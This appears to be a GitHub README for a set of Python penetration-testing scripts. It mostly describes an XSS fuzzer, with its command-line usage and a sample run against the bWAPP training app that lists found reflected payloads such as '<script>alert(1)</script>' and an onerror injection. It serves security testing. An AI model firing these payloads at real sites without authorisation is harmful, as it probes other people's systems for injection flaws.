# python_offensive_scripts
## A collection of Python scripts to automate/help during a pentest  

Borrowed some of the scripts from https://github.com/brandonprry/gray_hat_csharp_code
and translated them in **python** (and made them smarter).<br>


## xss_fuzzer
An easy and stupid XSS fuzzer that fuzz all parameters (still missing headers, it's in the TODO list)
with a small payload list.<br>
The script tries to detect an XSS vuln if the payload is rendered in the HTML output (but no check if the js is executed)
The usage of the script is pretty easy (and sqlmap like):
```bash
python xss_fuzzer.py --url <URL> --cookie <COOKIES> --data <POST_DATA> -v 
```
Where:
+ `--url`: The target URL
+ `--cookie`: The cookie string, if needed
+ `--data`: The data for the POST request
+ `-v`: Enables the verbose mode, use `git diff` to spot differences between correct requests and malformed ones (with the payloads)

An example (**bWAPP** - Reflected XSS (GET)):

```bash
python xss_fuzzer.py --url "http://172.16.13.130/bWAPP/xss_get.php?firstname=a&lastname=a&form=submit" --cookie "acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=creb27ffbb441il42ips8515j5; security_level=0"  
[!] Found payload: <script>alert(1)</script> in body for param: lastname
[!] Found payload: "><script>alert(1)</script> in body for param: lastname
[!] Found payload: " onerror="alert(1)" in body for param: lastname
[!] Found payload: <script>alert(1)</script> in body for param: firstname
[!] Found payload: "><script>alert(1)</script> in body for param: firstname
[!] Found payload: " onerror="alert(1)" in body for param: firstname
```

### Notes:
+ Actually, there is no need to use such a simple payload list if there is no check on JS execution.<br>
More sofisticated and encoded payloads will be more useful, I'll add them ASAP.
+ Replicate the -p option in sqlmap
